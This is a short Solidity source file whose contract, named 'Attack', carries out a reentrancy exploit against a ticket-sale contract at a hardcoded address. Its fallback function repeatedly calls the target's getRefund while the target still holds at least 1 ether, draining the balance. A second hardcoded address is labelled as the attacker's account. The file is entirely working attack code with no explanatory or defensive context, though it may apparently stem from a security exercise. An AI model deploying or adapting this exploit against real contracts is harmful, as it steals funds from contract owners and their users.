// SPDX-License-Identifier: ISC
pragma solidity 0.8.6;

interface targetInterface{
       function buyTickets(uint256 quantity) external payable;
       function getRefund(uint256 quantity) external payable;
    }

    contract Attack {
        
        // Bank Address here, change accordingly.
        targetInterface bankAddress = targetInterface(0x0C04A3E69e9E5EBb95a0A2C88717c0Bacb7B39bf);


        function Balance() external view returns(uint){
            return address(bankAddress).balance;
        }
        // this func is to view the attacker account balance. 
        function Balance2() external view returns(uint){
            return address(0x7dc030733963084060d97cB25d551d52f1841078).balance;
        }
    
        function attack() external payable {
            require(msg.value >= 1 ether);
            bankAddress.getRefund{value: 0 ether}(100);
        }

        function buyTickets() external payable{
            bankAddress.buyTickets{value: 1 ether}(100);
        }

        // Fallback 
        fallback () external payable {
            if (address(bankAddress).balance >= 1 ether) {
                bankAddress.getRefund{value: 0 ether}(100);
                //bankAddress.getRefund(100);
            }
        }
}
